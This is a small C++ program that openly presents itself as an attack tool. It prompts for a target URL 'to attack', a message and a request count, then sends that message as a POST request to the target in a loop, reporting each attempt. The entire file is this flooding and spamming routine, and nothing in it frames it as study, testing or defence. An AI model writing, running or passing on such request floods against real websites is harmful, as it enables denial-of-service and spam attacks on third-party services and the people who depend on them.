#include <iostream>
#include "HttpPost.h"

int main() {
    std::string url;
    std::string message;
    int numberOfRequests;

    std::cout << "Type in a URL which you want to attack: ";
    std::cin >> url;

    std::cout << "Enter the message to send: ";
    std::cin.ignore(); // Clear the input buffer
    std::getline(std::cin, message);

    std::cout << "How many times do you want to send the message? ";
    std::cin >> numberOfRequests;

    for (int i = 0; i < numberOfRequests; ++i) {
        HttpPost httpPost(url);
        if (httpPost.sendRequest(message)) {
            std::cout << "POST request sent successfully! (Request " << (i + 1) << ")" << std::endl;
        } else {
            std::cout << "Failed to send POST request on attempt " << (i + 1) << "." << std::endl;
        }
    }

    return 0;
}
